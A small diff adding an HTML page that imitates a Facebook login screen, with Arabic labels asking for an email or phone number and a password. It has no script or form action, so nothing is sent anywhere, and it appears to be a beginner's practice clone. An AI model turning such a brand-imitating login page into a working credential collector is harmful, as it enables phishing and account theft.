@@ -1,0 +1,31 @@
+<style>
+    * {   
+        text-align: Center;
+    }
+ 
+    #Text1 {
+        background:blue;
+        color: white;
+    }
+ 
+    #btn {
+         margin: 30px;
+    }
+    
+</style>
+
+
+<h1 id="text1">Facebook</h1>
+<title>Facebook</title>
+</head>
+<p>ادخل البريد الالكتروني او رقم الهاتف
+
+<input type="email">
+
+<p>ادخل كلمة المرور</p>
+
+<input type="password">
+
+<br>
+
+<button id="btn">تسجيل الدخول</button>
